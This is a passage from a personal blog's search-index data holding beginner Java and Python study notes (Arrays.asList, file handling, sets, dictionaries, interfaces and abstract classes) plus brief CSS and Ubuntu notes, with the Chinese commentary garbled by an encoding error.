the array by which the list will be backed Returns: a list view of the specified array asList public static &lt;T&gt; List&lt;T&gt; asList(T... a) è¿”å›ä¸€ä¸ªå—æŒ‡å®šæ•°ç»„æ”¯æŒçš„å›ºå®šå¤§å°çš„åˆ—è¡¨ã€‚ï¼ˆå¯¹è¿”å›åˆ—è¡¨çš„æ›´æ”¹ä¼šâ€œç›´æ¥å†™â€åˆ°æ•°ç»„ã€‚ï¼‰æ­¤æ–¹æ³•åŒ Collection.toArray() ä¸€èµ·ï¼Œå……å½“äº†åŸºäºæ•°ç»„çš„ API ä¸åŸºäº collection çš„ API ä¹‹é—´çš„æ¡¥æ¢ã€‚è¿”å›çš„åˆ—è¡¨æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œå¹¶ä¸”å®ç°äº† RandomAccessã€‚ æ­¤æ–¹æ³•è¿˜æä¾›äº†ä¸€ä¸ªåˆ›å»ºå›ºå®šé•¿åº¦çš„åˆ—è¡¨çš„ä¾¿æ·æ–¹æ³•ï¼Œè¯¥åˆ—è¡¨è¢«åˆå§‹åŒ–ä¸ºåŒ…å«å¤šä¸ªå…ƒç´ ï¼š List&lt;String&gt; stooges = Arrays.asList(&quot;Larry&quot;, &quot;Moe&quot;, &quot;Curly&quot;); å‚æ•°ï¼š a - æ”¯æŒåˆ—è¡¨çš„æ•°ç»„ã€‚ è¿”å›ï¼š æŒ‡å®šæ•°ç»„çš„åˆ—è¡¨è§†å›¾ã€‚ import java.util.Arrays; import java.util.List; public class AddingGroups { public static void main(String[] args) { List&lt;Integer&gt; list = Arrays.asList(16,17,18); System.out.println(list); //list.add(11); underlying array cannot be resized } } import java.util.*; public class ModifyingArraysAsList { public static void main(String[] args) { Random rand = new Random(47); Integer[] ia = {1,2,3,4,5,6,7,8,9,10}; List&lt;Integer&gt; list1 = new ArrayList&lt;Integer&gt;(Arrays.asList(ia));//ArrayList(Collection &lt;? extends E&gt; c) System.out.println(&quot;Before shuffing: &quot; + list1); Collections.shuffle(list1,rand); System.out.println(&quot;After shuffling: &quot; + list1); System.out.println(&quot;array: &quot; + Arrays.toString(ia));//æ‰“å°æ•°ç»„ List&lt;Integer&gt; list2 = Arrays.asList(ia); System.out.println(&quot;before shuffling : &quot; + list2); Collections.shuffle(list2,rand); System.out.println(&quot;After shuffing : &quot; + list2); System.out.println(&quot;array : &quot; + Arrays.toString(ia)); } } //Arrays.asList()äº§ç”Ÿçš„Listçš„å¯¹è±¡ä¼šä½¿ç”¨åº•å±‚æ•°ç»„ä½œä¸ºå…¶ç‰©ç†å®ç°æ˜¯å¾ˆé‡è¦çš„ï¼Œåªè¦ä½ æ‰§è¡Œçš„æ“ä½œçš„ä¿®æ”¹è¿™ä¸ªListï¼Œå¹¶ä¸”ä½ ä¸æƒ³åŸæ¥çš„æ•°ç»„è¢«ä¿®æ”¹ï¼Œé‚£ä¹ˆä½ å°±åº”è¯¥åœ¨å¦ä¸€ä¸ªå®¹å™¨ä¸­åˆ›å»ºä¸€ä¸ªå‰¯æœ¬ã€‚Before shuffing: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]After shuffling: [4, 6, 3, 1, 8, 7, 2, 5, 10, 9]array: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]before shuffling : [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]After shuffing : [9, 1, 6, 3, 7, 2, 5, 10, 4, 8]array : [9, 1, 6, 3, 7, 2, 5, 10, 4, 8] import java.util.*; public class ArrayIsNotIterable { public static void main(String[] args) { Integer[] ia = {1,2,3,4,5,6,7,8,9}; List&lt;Integer&gt; list = Arrays.asList(ia); list.set(1, 0); for(Integer x : ia){ System.out.print(x + &quot;\\t&quot;); } System.out.println(); System.out.print(&quot;list : &quot; + list); } }1 0 3 4 5 6 7 8 9list : [1, 0, 3, 4, 5, 6, 7, 8, 9]","categories":[],"tags":[{"name":"Javaå­¦ä¹ ","slug":"Javaå­¦ä¹ ","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"}]},{"title":"Pythonç¨‹åºè®¾è®¡~æ•°æ®å¤„ç†å­¦ä¹ ","slug":"Pythonç¨‹åºè®¾è®¡~æ•°æ®å¤„ç†å­¦ä¹ ","date":"2017-02-19T06:46:16.000Z","updated":"2020-11-14T17:11:57.211Z","comments":true,"path":"2017/02/19/Pythonç¨‹åºè®¾è®¡~æ•°æ®å¤„ç†å­¦ä¹ /","link":"","permalink":"http://yoursite.com/2017/02/19/Python%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1~%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"1.read file infile = open(fileName,&apos;r&apos;) #for line in infile:#éå†æ–‡ä»¶ listVar = [line.rstrip() for line in infile]å°†æ¯ä¸€è¡Œç”Ÿæˆåˆ—è¡¨ strVar = infile.read()#è¯»å–æ–‡ä»¶å…¨éƒ¨å†…å®¹ç½®äºä¸€ä¸ªå­—ç¬¦ä¸² strVar = infile.readline()#è¯»å–å½“å‰æŒ‡é’ˆæŒ‡å‘çš„é‚£ä¸€è¡Œï¼Œåˆšå¼€å§‹æ˜¯ç½®äºæ–‡ä»¶ç¬¬ä¸€è¡Œï¼Œæ‰§è¡Œè¯­å¥åï¼Œå°†ç½®äºæœ«å°¾ã€‚å‡†å¤‡è¯»å–ä¸‹ä¸€è¡Œ infile.close()#close file Test.txtæ–‡ä»¶ä¸­å†…å®¹å¦‚ä¸‹ Google Baidu Yahoo å…¶å®æ˜¯ä»¥ä¸‹çš„æ–¹å¼ Google\\nBaidu\\nYahoo\\n2.create file outfile = open(fileName,&apos;w&apos;) outfile.write(strVar) outfile.writelines(strVar) #file.write(str)çš„å‚æ•°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå°±æ˜¯ä½ è¦å†™å…¥æ–‡ä»¶çš„å†…å®¹. #file.writelines(sequence)çš„å‚æ•°æ˜¯åºåˆ—ï¼Œæ¯”å¦‚åˆ—è¡¨ï¼Œå®ƒä¼šè¿­ä»£å¸®ä½ å†™å…¥æ–‡ä»¶. outfile.close()3.opened for append outfile = open(fileName,&apos;a&apos;)#æ‰“å¼€æ–‡ä»¶åœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ  outfile.write(strVar) outfile.writelines(strVar) outfile.close()4.setliståˆ—è¡¨æ˜¯å…ƒç´ çš„é¡ºåºå­˜å‚¨å®¹å™¨ï¼Œè€Œä¸”å…è®¸å…ƒç´ é‡å¤seté›†åˆæ˜¯å…ƒç´ çš„æ— åºå­˜å‚¨å®¹å™¨ï¼Œä¸å…è®¸å…ƒç´ é‡å¤ {&quot;spam&quot;,&quot;ni&quot;},{3,4,7},{True,7,&quot;eleven&quot;},{&apos;a&apos;,&apos;b&apos;,(3,4)}#ä»¥ä¸Šéƒ½æ˜¯set #é›†åˆæ“ä½œ word = {&quot;spam&quot;,&quot;ni&quot;} set.add()#word.add(&quot;eggs&quot;)#words = {&quot;spam&quot;,&quot;ni&quot;,&quot;eggs&quot;} set.discard()#discardä¸¢å¼ƒï¼ŒæŠ›å¼ƒ; è§£é›‡; å‡ºç‰Œ;word.discard(&quot;ni&quot;)words = {&quot;spam&quot;} set.clear()#words.clear() words = {} set#set([3,7,3])#{3,7} set#set((3,7,3))#{7,3} {x*x for x in range(-3,3)}#{0,1,4,9} set1.union(set2)#set1âˆªset2 set1.intersection(set2)#set1âˆ©set2 set1.difference(set2)#set1-set2 File1.txt Alpha Bravo Charlie File2.txt Bravo Delta def main(): infile = open(&quot;File1.txt&quot;,&apos;r&apos;) firstSet = {line.rstrip() for line in infile} infile.close() infile = open(&quot;File2.txt&quot;,&apos;r&apos;) firstSet = {line.rstrip() for line in infile} infile.close() outfile = open(&quot;Union.txt&quot;,&apos;w&apos;) outfile.writelines(set1.union(set2)) outfile.close() outfile = open(&quot;Intersection.txt&quot;,&apos;w&apos;) outfile.writelines(set1.intersection(set2)) outfile.close() outfile = open(&quot;Difference.txt&quot;,&apos;w&apos;) outfile.writelines(set1.difference(set2)) outfile.close() main() Union.txt#Alpha,Bravo,Charlie,Delta Intersection.txt#Bravo Difference.txt#Alpha,Charlie5.csvæ–‡ä»¶å°†æ•°æ®ä»¥é€—å·åˆ†éš”ï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥ä¸æ˜¯é€—å·ï¼‰è­¬å¦‚csvDemo.csvname,passwd,age,addresszhangsan,123456,15,sichuanglisiï¼Œ45612,15ï¼Œjiangshuå¯ä»¥åœ¨excelä¸­æ‰“å¼€ UN.txt Canada,North America,34.8,385500 France,Europe,66.3,211209 New Zealand,Austrlia/Oceania,4.4,103738 Nigeria,Africa,177.2,356669 Pakistan,Asia,196.2,310403 Peru,South America,30.1,496226 #----------------- def main(): continent = input(&quot;Enter the name of a continent:&quot;) continent = continent.title()#Allow for all lowercase letters if continent != &apos;Antarctica&apos;: infile = open(&quot;UN.txt&quot;,&apos;r&apos;) for line in infile: data = line.split(&apos;,&apos;) if data[1] == continent: print(data[0]) else: print(&quot;There are no counteries in Antarctica&quot;) #------- Enter the name of a continent:North America Canada6.dictå­—å…¸ bob = {&quot;firstName&quot;:&quot;Robert&quot;,&quot;lastName&quot;:&quot;Smith&quot;,&quot;age&quot;:19} print(bob[&quot;firstName&quot;],bob[&quot;lastName&quot;],&quot;is&quot;,bob[&quot;age&quot;],&quot;years old.&quot;) [RUN] Robert Smith is 19 years old.dictæ“ä½œ len(d)#å­—å…¸ä¸­å…ƒç´ (é”®å€¼å¯¹)çš„ä¸ªæ•° x in d#å¦‚æœxæ˜¯å­—å…¸çš„ä¸€ä¸ªé”®ï¼Œè¿”å›True x:y in d#å¦‚æœx:yæ˜¯å­—å…¸ä¸­çš„å…ƒç´ ï¼Œè¿”å›True#not in d[key1] = value1#è¿”å›key1å¯¹åº”çš„å€¼ï¼Œå¦è€…æŠ›å‡ºå¼‚å¸¸ d.get(key1,default)#å¦‚æœå­˜åœ¨key1åˆ™è¿”å›value1ï¼Œå¦è€…è¿”å›default list(d.keys())#è¿”å›å­—å…¸é”®ç»„æˆçš„list list(d.values())#è¿”å›å­—å…¸å€¼ç»„æˆçš„list list(d.items())#è¿”å›(key,value)å½¢æˆçš„äºŒå…ƒç»„ç»„æˆçš„åˆ—è¡¨ï¼Œå…¶ä¸­d[key]=value list(d)#set(d)#tuple(d)#è¿”å›å­—å…¸çš„é”®ç»„æˆçš„åˆ—è¡¨ï¼Œé›†åˆï¼Œå…ƒç»„ c = {}#åˆ›å»ºä¸€ä¸ªå­—å…¸ c = dict(d)#åˆ›å»ºå­—å…¸dçš„ä¸€ä¸ªæ‹·è´ d.update(c)#å°†å­—å…¸cæ‰€æœ‰çš„å…ƒç´ åˆå¹¶å…¥å­—å…¸dã€‚å¦‚æœä¸¤ä¸ªå…ƒç´ æ‹¥æœ‰ç›¸åŒçš„é”®ï¼Œåˆ™ä½¿ç”¨cä¸­çš„å€¼æ›¿æ¢dä¸­çš„å€¼å®ä¾‹ eg 1: def translate(color):#è‹±è¯­ç¿»è¯‘æˆæ„å¤§åˆ©è¯­ if color == &quot;red&quot;: return &quot;rojo&quot; elif color == &quot;blue&quot;: return &quot;aloz&quot; elif color == &quot;green&quot;: return &quot;verdi&quot; elif color == &quot;white&quot;: return &quot;blanco&quot; #----- translate = {&quot;red&quot;:&quot;rojo&quot;,&quot;blue&quot;:&quot;aloz&quot;,&quot;green&quot;:&quot;verdi&quot;,&quot;white&quot;:&quot;blanco&quot;} eg 2: list1 = [[&quot;one&quot;,1],[&quot;two&quot;,2],[&quot;three&quot;,3]] æˆ–list1 = [(&quot;one&quot;,1),(&quot;two&quot;,2),(&quot;three&quot;,3)] dict(list1) {&quot;one&quot;:1,&quot;two&quot;:2,&quot;three&quot;:3} eg 3: Textese.txt anyone,nei are,r ate,8 band,b&amp; be,b #----- def main(): texteseDict = createDictionary(&quot;Textese.txt&quot;) print(&quot;Enter a simple sentence in lowercase letters without&quot;) sentence = input(&quot;any punctuation: &quot;) print() translate(sentence,texteseDict) def createDictionary(fileName): infile = open(fileName,&apos;r&apos;) textList = [line.rstrip() for line in infile] infile.close() return dict([var.split(&apos;,&apos;) for var in textList]) def translate(sentence,texteseDict): words = sentence.split() for word in words: print(texteseDict.get(word,word)+&quot; &quot;,end = &quot; &quot;) main() è€—æ—¶2hå†™å¥½","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"æ•°æ®","slug":"æ•°æ®","permalink":"http://yoursite.com/tags/%E6%95%B0%E6%8D%AE/"}]},{"title":"pycharmä¸­ä¿®æ”¹pythonç‰ˆæœ¬","slug":"pycharmä¸­ä¿®æ”¹pythonç‰ˆæœ¬","date":"2017-01-05T08:22:47.000Z","updated":"2020-11-14T17:11:57.741Z","comments":true,"path":"2017/01/05/pycharmä¸­ä¿®æ”¹pythonç‰ˆæœ¬/","link":"","permalink":"http://yoursite.com/2017/01/05/pycharm%E4%B8%AD%E4%BF%AE%E6%94%B9python%E7%89%88%E6%9C%AC/","excerpt":"","text":"File-&gt;Settings-&gt;project:XXX-&gt;Project Interpreter may be you can happy more","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"hover","slug":"hover","date":"2016-12-18T12:26:58.000Z","updated":"2020-11-14T17:11:58.204Z","comments":true,"path":"2016/12/18/hover/","link":"","permalink":"http://yoursite.com/2016/12/18/hover/","excerpt":"","text":"å½“é¼ æ ‡ç§»åŠ¨åˆ°å…ƒç´ ä¸Šæ—¶ï¼Œå˜å˜é¢œè‰²ä»€ä¹ˆçš„ï¼Œå¯ä»¥ç”¨hoverï¼Œhoverå¯ä»¥å’Œä»»ä½•å…ƒç´ æ­é…ï¼Œåªæ˜¯é€šå¸¸å’Œa:hoverï¼Œä½†æ˜¯åˆšåˆšç”¨åˆ°äº†ul li:hover{ #left ul li{border-bottom:1px solid #999; background-image:url(images/bullet-green.gif); background-repeat:no-repeat;width:150px; margin-left:0px; text-align:center; } #left a{color:black; font-weight: bold;} #left ul li:hover{background-image: url(images/bullet-red.gif);background-repeat: no-repeat;}","categories":[],"tags":[{"name":"css","slug":"css","permalink":"http://yoursite.com/tags/css/"}]},{"title":"ubuntuä¸‹é…ç½®","slug":"ubuntuä¸‹é…ç½®","date":"2016-11-28T02:50:14.000Z","updated":"2020-11-14T17:11:58.684Z","comments":true,"path":"2016/11/28/ubuntuä¸‹é…ç½®/","link":"","permalink":"http://yoursite.com/2016/11/28/ubuntu%E4%B8%8B%E9%85%8D%E7%BD%AE/","excerpt":"","text":"Chrome Android Studio Eclipse Sublime Text WebStorm jetBrainsæ³¨å†Œç  PyCharm CLion ç½‘æ˜“äº‘éŸ³ä¹ Unity Tweak Tool ä¸»é¢˜Numix Numix daily Flatabulous å›¾æ ‡numix-circle-light IDLE KchmViewer çœ‹chmæ–‡ä»¶ 12.","categories":[],"tags":[{"name":"ubuntu","slug":"ubuntu","permalink":"http://yoursite.com/tags/ubuntu/"}]},{"title":"javaæ¥å£interface","slug":"javaæ¥å£interface","date":"2016-11-23T09:33:52.000Z","updated":"2020-11-14T17:11:59.168Z","comments":true,"path":"2016/11/23/javaæ¥å£interface/","link":"","permalink":"http://yoursite.com/2016/11/23/java%E6%8E%A5%E5%8F%A3interface/","excerpt":"","text":"ä»£ç  package Interface; public class InterfaceDemo { public static void main(String[] args) { //System.out.println(IAbility.number); //System.out.println(IAbility.number++); //The final field IAbility.number cannot be assignedèµ‹å€¼ Person person=new Person(); IAbility iability1=new Child(); IAbility iability2=new Dog(); person.feed(iability1); person.feed(iability2); if(iability1 instanceof Child){ Child children = (Child)iability1; children.hhh(); } Dog dog = new Dog(); Child child = new Child(); person.feed(dog); person.feed(child); } } class Person{ /* public void feed(Child child){ child.eat(); } public void feed(Dog dog){ dog.eat(); }*/ //interface public void feed(IAbility ability){ ability.eat();//dongtai bangding } } interface IAbility{ //public static final int number = 1;//int number = 1;default number is public static final /*public abstract*//* void show();*///void show();default is public abstract public abstract void eat(); } class Child implements IAbility{ @Override public void eat(){ System.out.println(&quot;eat rice&quot;); } public void hhh(){ System.out.println(&quot;nihao&quot;); } } class Dog implements IAbility{ @Override public void eat(){ System.out.println(&quot;eat bone&quot;); } } interface Action{ int number = 1;//public static final int number = 1; /*ä¸¤ä¸ªæ„æ€æ˜¯ä¸€æ ·çš„*/ public void eat();/*public abstract void eat();*/ } /*ä¸ºä»€ä¹ˆç”¨åˆ°interface,å› ä¸ºchildå’Œdogç±»å¹¶æ²¡æœ‰ç‰¹å®šçš„çˆ¶ç±»,è€Œä»–ä»¬çš„æ–¹æ³•å¯ä»¥é€šè¿‡æ¥å£å®ç°*/ 1. å­ç±»åœ¨é€‰æ‹©æŠ½è±¡ç±»è¿˜æ˜¯æ¥å£,æ˜¯æŠ½è±¡ç±»æ˜¯ä¸€ç§is-a,è€Œæ¥å£æ˜¯like-a2. _å­ç±»å¯ä»¥æœ‰ å¤šä¸ª æ¥å£(extends),ä½†åªæœ‰ä¸€ä¸ªçˆ¶ç±»(æ™®é€šç±»æˆ–æŠ½è±¡ç±»)(implements) _ ä»¥ä¸‹ æ˜¯æ¥è‡ªä¸€ä¸ªå¤§ä½¬çš„å¯¹abstract classå’Œinterfaceæ·±å…¥ç†è§£[ å¤§ä½¬çš„ç†è§£ ](https://www.ibm.com/developerworks/cn/java/l-javainterface-abstract/) /*ç›®çš„:å®‰å…¨é—¨*/ 1. abstract class Door { abstract void open(); abstract void close()ï¼› abstract void alarm(); } class AlarmDoor extends Door { void open() { â€¦ } void close() { â€¦ } void alarm() { â€¦ } } 2.interface Door { void open(); void close(); void alarm(); } class AlarmDoor implements Door ï½› void open() { â€¦ } void close() { â€¦ } void alarm() { â€¦ } ï½ è¿™ç§æ–¹æ³•è¿åäº†é¢å‘å¯¹è±¡è®¾è®¡ä¸­çš„ä¸€ä¸ªæ ¸å¿ƒåŸåˆ™ISPï¼ˆInterface Segregation Pricipleï¼‰ï¼Œåœ¨Doorçš„å®šä¹‰ä¸­æŠŠDooræ¦‚å¿µæœ¬èº«å›ºæœ‰çš„è¡Œä¸ºæ–¹æ³•å’Œå¦å¤–ä¸€ä¸ªæ¦‚å¿µ&quot;æŠ¥è­¦å™¨&quot;çš„è¡Œä¸ºæ–¹æ³•æ··åœ¨äº†ä¸€èµ·ã€‚è¿™æ ·å¼•èµ·çš„ä¸€ä¸ªé—®é¢˜æ˜¯é‚£äº›ä»…ä»…ä¾èµ–äºDoorè¿™ä¸ªæ¦‚å¿µçš„æ¨¡å—ä¼šå› ä¸º&quot;æŠ¥è­¦å™¨&quot;è¿™ä¸ªæ¦‚å¿µçš„æ”¹å˜ï¼ˆæ¯”å¦‚ï¼šä¿®æ”¹alarmæ–¹æ³•çš„å‚æ•°ï¼‰è€Œæ”¹å˜ï¼Œåä¹‹ä¾ç„¶ã€‚ //--------------------------------------------------------- //ä»¥ä¸‹æ˜¯æ­£ç¡®çš„ /*æ—¢ç„¶openã€closeå’Œalarmå±äºä¸¤ä¸ªä¸åŒçš„æ¦‚å¿µï¼Œæ ¹æ®ISPåŸåˆ™åº”è¯¥æŠŠå®ƒä»¬åˆ†åˆ«å®šä¹‰åœ¨ä»£è¡¨è¿™ä¸¤ä¸ªæ¦‚å¿µçš„æŠ½è±¡ç±»ä¸­ã€‚å®šä¹‰æ–¹å¼æœ‰ï¼šè¿™ä¸¤ä¸ªæ¦‚å¿µéƒ½ä½¿ç”¨abstract classæ–¹å¼å®šä¹‰ï¼›ä¸¤ä¸ªæ¦‚å¿µéƒ½ä½¿ç”¨interfaceæ–¹å¼å®šä¹‰ï¼›ä¸€ä¸ªæ¦‚å¿µä½¿ç”¨abstract classæ–¹å¼å®šä¹‰ï¼Œå¦ä¸€ä¸ªæ¦‚å¿µä½¿ç”¨interfaceæ–¹å¼å®šä¹‰ã€‚ æ˜¾ç„¶ï¼Œç”±äºJavaè¯­è¨€ä¸æ”¯æŒå¤šé‡ç»§æ‰¿ï¼Œæ‰€ä»¥ä¸¤ä¸ªæ¦‚å¿µéƒ½ä½¿ç”¨abstract classæ–¹å¼å®šä¹‰æ˜¯ä¸å¯è¡Œçš„ã€‚åé¢ä¸¤ç§æ–¹å¼éƒ½æ˜¯å¯è¡Œçš„ï¼Œä½†æ˜¯å¯¹äºå®ƒä»¬çš„é€‰æ‹©å´åæ˜ å‡ºå¯¹äºé—®é¢˜é¢†åŸŸä¸­çš„æ¦‚å¿µæœ¬è´¨çš„ç†è§£ã€å¯¹äºè®¾è®¡æ„å›¾çš„åæ˜ æ˜¯å¦æ­£ç¡®ã€åˆç†ã€‚æˆ‘ä»¬ä¸€ä¸€æ¥åˆ†æã€è¯´æ˜ã€‚ å¦‚æœä¸¤ä¸ªæ¦‚å¿µéƒ½ä½¿ç”¨interfaceæ–¹å¼æ¥å®šä¹‰ï¼Œé‚£ä¹ˆå°±åæ˜ å‡ºä¸¤ä¸ªé—®é¢˜ï¼š1ã€æˆ‘ä»¬å¯èƒ½æ²¡æœ‰ç†è§£æ¸…æ¥šé—®é¢˜é¢†åŸŸï¼ŒAlarmDooråœ¨æ¦‚å¿µæœ¬è´¨ä¸Šåˆ°åº•æ˜¯Doorè¿˜æ˜¯æŠ¥è­¦å™¨ï¼Ÿ2ã€å¦‚æœæˆ‘ä»¬å¯¹äºé—®é¢˜é¢†åŸŸçš„ç†è§£æ²¡æœ‰é—®é¢˜ï¼Œæ¯”å¦‚ï¼šæˆ‘ä»¬é€šè¿‡å¯¹äºé—®é¢˜é¢†åŸŸçš„åˆ†æå‘ç°AlarmDooråœ¨æ¦‚å¿µæœ¬è´¨ä¸Šå’ŒDooræ˜¯ä¸€è‡´çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨å®ç°æ—¶å°±æ²¡æœ‰èƒ½å¤Ÿæ­£ç¡®çš„æ­ç¤ºæˆ‘ä»¬çš„è®¾è®¡æ„å›¾ï¼Œå› ä¸ºåœ¨è¿™ä¸¤ä¸ªæ¦‚å¿µçš„å®šä¹‰ä¸Šï¼ˆå‡ä½¿ç”¨interfaceæ–¹å¼å®šä¹‰ï¼‰åæ˜ ä¸å‡ºä¸Šè¿°å«ä¹‰ã€‚ å¦‚æœæˆ‘ä»¬å¯¹äºé—®é¢˜é¢†åŸŸçš„ç†è§£æ˜¯ï¼šAlarmDooråœ¨æ¦‚å¿µæœ¬è´¨ä¸Šæ˜¯Doorï¼ŒåŒæ—¶å®ƒæœ‰å…·æœ‰æŠ¥è­¦çš„åŠŸèƒ½ã€‚æˆ‘ä»¬è¯¥å¦‚ä½•æ¥è®¾è®¡ã€å®ç°æ¥æ˜ç¡®çš„åæ˜ å‡ºæˆ‘ä»¬çš„æ„æ€å‘¢ï¼Ÿå‰é¢å·²ç»è¯´è¿‡ï¼Œabstract classåœ¨Javaè¯­è¨€ä¸­è¡¨ç¤ºä¸€ç§ç»§æ‰¿å…³ç³»ï¼Œè€Œç»§æ‰¿å…³ç³»åœ¨æœ¬è´¨ä¸Šæ˜¯&quot;is a&quot;å…³ç³»ã€‚æ‰€ä»¥å¯¹äºDoorè¿™ä¸ªæ¦‚å¿µï¼Œæˆ‘ä»¬åº”è¯¥ä½¿ç”¨abstarct classæ–¹å¼æ¥å®šä¹‰ã€‚å¦å¤–ï¼ŒAlarmDooråˆå…·æœ‰æŠ¥è­¦åŠŸèƒ½ï¼Œè¯´æ˜å®ƒåˆèƒ½å¤Ÿå®ŒæˆæŠ¥è­¦æ¦‚å¿µä¸­å®šä¹‰çš„è¡Œä¸ºï¼Œæ‰€ä»¥æŠ¥è­¦æ¦‚å¿µå¯ä»¥é€šè¿‡interfaceæ–¹å¼å®šä¹‰ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š*/ abstract class Door { abstract void open(); abstract void close()ï¼› } interface Alarm { void alarm(); } class AlarmDoor extends Door implements Alarm { void open() { â€¦ } void close() { â€¦ } void alarm() { â€¦ } } /*è¿™ç§å®ç°æ–¹å¼åŸºæœ¬ä¸Šèƒ½å¤Ÿæ˜ç¡®çš„åæ˜ å‡ºæˆ‘ä»¬å¯¹äºé—®é¢˜é¢†åŸŸçš„ç†è§£ï¼Œæ­£ç¡®çš„æ­ç¤ºæˆ‘ä»¬çš„è®¾è®¡æ„å›¾ã€‚å…¶å®abstract classè¡¨ç¤ºçš„æ˜¯&quot;is a&quot;å…³ç³»ï¼Œinterfaceè¡¨ç¤ºçš„æ˜¯&quot;like a&quot;å…³ç³»ï¼Œå¤§å®¶åœ¨é€‰æ‹©æ—¶å¯ä»¥ä½œä¸ºä¸€ä¸ªä¾æ®ï¼Œå½“ç„¶è¿™æ˜¯å»ºç«‹åœ¨å¯¹é—®é¢˜é¢†åŸŸçš„ç†è§£ä¸Šçš„ï¼Œæ¯”å¦‚ï¼šå¦‚æœæˆ‘ä»¬è®¤ä¸ºAlarmDooråœ¨æ¦‚å¿µæœ¬è´¨ä¸Šæ˜¯æŠ¥è­¦å™¨ï¼ŒåŒæ—¶åˆå…·æœ‰Doorçš„åŠŸèƒ½ï¼Œé‚£ä¹ˆä¸Šè¿°çš„å®šä¹‰æ–¹å¼å°±è¦åè¿‡æ¥äº†ã€‚*/abstractclasså’Œinterfaceæ˜¯Javaè¯­è¨€ä¸­çš„ä¸¤ç§å®šä¹‰æŠ½è±¡ç±»çš„æ–¹å¼ï¼Œå®ƒä»¬ä¹‹é—´æœ‰å¾ˆå¤§çš„ç›¸ä¼¼æ€§ã€‚ä½†æ˜¯å¯¹äºå®ƒä»¬çš„é€‰æ‹©å´åˆå¾€å¾€åæ˜ å‡ºå¯¹äºé—®é¢˜é¢†åŸŸä¸­çš„æ¦‚å¿µæœ¬è´¨çš„ç†è§£ã€å¯¹äºè®¾è®¡æ„å›¾çš„åæ˜ æ˜¯å¦æ­£ç¡®ã€åˆç†ï¼Œå› ä¸ºå®ƒä»¬è¡¨ç°äº†æ¦‚å¿µé—´çš„ä¸åŒçš„å…³ç³»ï¼ˆè™½ç„¶éƒ½èƒ½å¤Ÿå®ç°éœ€æ±‚çš„åŠŸèƒ½ï¼‰ã€‚è¿™å…¶å®ä¹Ÿæ˜¯è¯­è¨€çš„ä¸€ç§çš„æƒ¯ç”¨æ³•ï¼Œå¸Œæœ›è¯»è€…æœ‹å‹èƒ½å¤Ÿç»†ç»†ä½“ä¼šã€‚","categories":[],"tags":[{"name":"Javaå­¦ä¹ ","slug":"Javaå­¦ä¹ ","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"}]},{"title":"javaæŠ½è±¡ç±»","slug":"javaæŠ½è±¡ç±»","date":"2016-11-23T09:06:57.000Z","updated":"2020-11-14T17:11:59.853Z","comments":true,"path":"2016/11/23/javaæŠ½è±¡ç±»/","link":"","permalink":"http://yoursite.com/2016/11/23/java%E6%8A%BD%E8%B1%A1%E7%B1%BB/","excerpt":"","text":"å­¦ä¹ è‡ªèŒåæ ‡,ä»¥ä¸‹ä»£ç å¤§éƒ¨åˆ†å±äº1.ä»£ç è§£é‡Š package Abstract; public class EmployeeDemo { public static void main(String[] args) { JavaTeacher teacher = new JavaTeacher(10, &quot;å¼ ä¸‰&quot;, 10000); teacher.work(); teacher.aa(); Leader leader = new Leader(11,&quot;boss&quot;,10000,10000); leader.work(); //Employee emp = new Employee(10,&quot;hello&quot;,1000); //Cannot instantiate the type Employeeæ— æ³•å®ä¾‹åŒ–çš„ç±»å‹çš„å‘˜å·¥ /* * ä¸€ä¸‹å†…å®¹é€šè¿‡å¤šæ€ * */ System.out.println(&quot;----------------------------------&quot;); System.out.println(&quot;ä¸€ä¸‹æ¶‰åŠå¤šæ€&quot;); Employee employee1 = new JavaTeacher(10, &quot;å¼ ä¸‰&quot;, 10000); employee1.work(); Employee employee2 = new Leader(11,&quot;boss&quot;,10000,10000); employee2.work(); //leader1.more(); //The method more() is undefined for the type Employee if(employee2 instanceof Leader){ System.out.println(&quot;æ­å–œä½ ,å¯ä»¥å‘ä¸‹è½¬å‹&quot;); Leader lead = (Leader)employee2; //å¯ä»¥å®ç°leadç‰¹æœ‰çš„æ–¹æ³• lead.more(); //å®³çš„æˆ‘èµ¶ç´§çœ‹çœ‹æˆ‘çš„æ´¥è´´æœ‰æ²¡æœ‰ä¸¢å¤± lead.getAllowance(); } } } //æŠ½è±¡ç±»(ä¸€æ—¦ä¸€ä¸ªç±»æœ‰æŠ½è±¡æ–¹æ³•,é‚£è¿™ä¸ªç±»å°±æ˜¯æŠ½è±¡ç±») //ä½†æŠ½è±¡ç±»ä¸­ä¹Ÿå¯èƒ½æœ‰å…·ä½“çš„æ–¹æ³• abstract class Employee{ private int number; private String name; private double salary; public Employee(int number,String name,double salary){ this.number = number; this.name = name; this.salary = salary; } //æŠ½è±¡æ–¹æ³• public abstract void work();//æ³¨æ„æŠ½è±¡æ–¹æ³•çš„å†™æ³•,åªæ˜¯å£°æ˜ public void aa(){ System.out.println(&quot; say hello&quot;); } } //ä¸€æ—¦ä¸€ä¸ªç±»å»ç»§æ‰¿äº†æŠ½è±¡ç±»,é‚£ä¹ˆè¿™ä¸ªç±»å°±è¦ä¹ˆå®ç°æŠ½è±¡ç±»çš„æŠ½è±¡æ–¹æ³•,è¦ä¹ˆç»§ç»­æŠ½è±¡ä¸‹å» class JavaTeacher extends Employee{ public JavaTeacher(int number, String name, double salary) { super(number, name, salary); } @Override public void work(){ System.out.println(&quot;ä¸ŠJavaè¯¾&quot;); } } class Leader extends Employee{ private double allowance;//ç‰¹æœ‰å±æ€§æ´¥è´´ public 